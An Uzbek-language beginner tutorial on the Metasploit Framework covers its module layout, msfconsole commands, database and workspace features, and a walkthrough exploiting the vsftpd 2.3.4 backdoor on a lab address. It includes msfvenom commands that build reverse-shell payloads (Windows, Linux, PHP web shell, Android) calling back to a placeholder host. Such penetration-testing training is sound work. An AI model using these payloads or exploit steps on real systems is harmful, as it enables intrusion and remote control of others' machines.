# 🎯 Metasploit: Introduction (Kirish)

> **Maqsad:** Metasploit Framework ning asosiy tuzilishi, komponentlari va interfeysi bilan tanishish.

---

## 📖 Metasploit nima?

**Metasploit Framework** — dunyadagi eng keng tarqalgan penetration testing platformasi. Ruby tilida yozilgan, Rapid7 tomonidan qo'llab-quvvatlanadi.

```
2 versiyasi:
Metasploit Framework (MSF) → Bepul, open-source
Metasploit Pro             → Pullik, qo'shimcha imkoniyatlar
```

---

## 🏗️ Metasploit Tuzilishi

```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/     → Zaifliklarni ishlatish
│   ├── auxiliary/    → Skan, brute force, fuzz
│   ├── post/         → Post-exploitation
│   ├── payloads/     → Shell kodlar
│   ├── encoders/     → Payloadni yashirish
│   └── nops/         → NOP sled
├── scripts/
├── tools/
└── plugins/
```

---

## 🖥️ Metasploit Komponentlari

### msfconsole — Asosiy Interface
```bash
# Ishga tushirish:
msfconsole
msfconsole -q          # Bannersiz (tez)

# Ma'lumotlar bazasi bilan:
sudo systemctl start postgresql
sudo msfdb init
msfconsole
```

### msfvenom — Payload Yaratish
```bash
# Windows reverse shell:
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -f exe -o shell.exe

# Linux reverse shell:
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -f elf -o shell.elf

# PHP web shell:
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -f raw -o shell.php

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP LPORT=4444 \
  -o shell.apk

# Payload ro'yxati:
msfvenom -l payloads
msfvenom -l payloads | grep windows
msfvenom -l formats    # Fayl formatlari
```

---

## 📋 msfconsole Asosiy Buyruqlari

### Navigatsiya:
```bash
help                    # Yordam
?                       # Yordam (qisqa)
exit / quit             # Chiqish
clear                   # Ekranni tozalash
history                 # Buyruqlar tarixi
version                 # Metasploit versiyasi
```

### Qidirish va Tanlash:
```bash
search vsftpd                    # Nom bo'yicha
search type:exploit              # Tur bo'yicha
search platform:windows          # Platforma
search CVE-2021-44228            # CVE bo'yicha
search rank:excellent            # Daraja bo'yicha
search name:smb type:exploit     # Kombinatsiya

use exploit/unix/ftp/vsftpd_234_backdoor
use 0                            # Tartib raqami bilan
```

### Modul bilan ishlash:
```bash
info                    # Modul haqida to'liq ma'lumot
show options            # Parametrlar
show advanced           # Kengaytirilgan parametrlar
show payloads           # Mos payload lar
show targets            # Maqsad tizimlar
back                    # Modul dan chiqish
previous                # Oldingi modul
```

### Parametrlar:
```bash
set RHOSTS 10.10.10.1          # Maqsad IP
set RPORT 21                   # Maqsad port
set LHOST 10.10.14.1           # Sizning IP
set LPORT 4444                 # Sizning port
set PAYLOAD windows/shell/reverse_tcp
set VERBOSE true               # Batafsil

unset RHOSTS                   # Parametrni o'chirish
unset all                      # Hammasini o'chirish

setg RHOSTS 10.10.10.1         # Global parametr (barcha modullarda)
unsetg RHOSTS                  # Global parametrni o'chirish
```

### Ishga tushirish:
```bash
run                     # Ishga tushirish
exploit                 # Ishga tushirish (synonym)
exploit -j              # Background da
exploit -z              # Shell bilan interact qilmasdan
check                   # Zaiflik bormi? (ba'zi modullarda)
```

---

## 🗄️ Ma'lumotlar Bazasi

```bash
# PostgreSQL ulanish:
db_status               # Holat tekshirish

# Hosts:
hosts                   # Saqlangan hostlar
hosts -R                # RHOSTS ga o'rnatish

# Services:
services                # Saqlangan xizmatlar
services -p 80          # Port bo'yicha filter
services -S http        # Nom bo'yicha filter

# Nmap natijalarini import:
db_nmap -sV 10.10.10.1  # Nmap + avtomatik saqlash
db_import scan.xml       # XML import

# Credentials:
creds                   # Saqlangan parollar
loot                    # Saqlangan ma'lumotlar
```

---

## 💼 Workspace (Ish Maydoni)

```bash
workspace               # Joriy workspace
workspace -a pentest1   # Yangi workspace
workspace pentest1      # Workspace ga o'tish
workspace -d pentest1   # O'chirish
workspace -r old new    # Nomini o'zgartirish
```

---

## 📊 Modul Daraja (Rank)

| Daraja | Ma'nosi |
|--------|---------|
| **Excellent** | Tizimga ta'sir qilmaydi |
| **Great** | Ishonchli |
| **Good** | Yaxshi |
| **Normal** | Oddiy |
| **Average** | O'rtacha |
| **Low** | Past |
| **Manual** | Qo'lda bajarish kerak |

---

## 🎯 Amaliy Misol: Birinchi Exploit

```bash
# 1. Metasploit ishga tushirish:
msfconsole -q

# 2. Ma'lumotlar bazasini tekshirish:
db_status

# 3. Nmap skan (ma'lumotlar bazasiga saqlash):
db_nmap -sV 10.10.10.1

# 4. Natijalarni ko'rish:
hosts
services

# 5. Zaiflik qidirish:
search vsftpd 2.3.4

# 6. Exploit tanlash:
use exploit/unix/ftp/vsftpd_234_backdoor

# 7. Parametrlar ko'rish:
show options

# 8. Sozlash:
set RHOSTS 10.10.10.1
run
```

---

## 💡 Eslab Qolish Uchun

| Buyruq | Vazifasi |
|--------|---------|
| `search` | Modul qidirish |
| `use` | Modul tanlash |
| `info` | Modul ma'lumoti |
| `show options` | Parametrlar |
| `set` | Parametr o'rnatish |
| `run/exploit` | Ishga tushirish |
| `db_nmap` | Nmap + DB saqlash |
| `hosts/services` | DB natijalar |
| `workspace` | Loyiha boshqarish |

```bash
# Standart workflow:
msfconsole -q
search XIZMAT VERSIYA
use EXPLOIT
set RHOSTS IP
set LHOST YOUR_IP
run
```
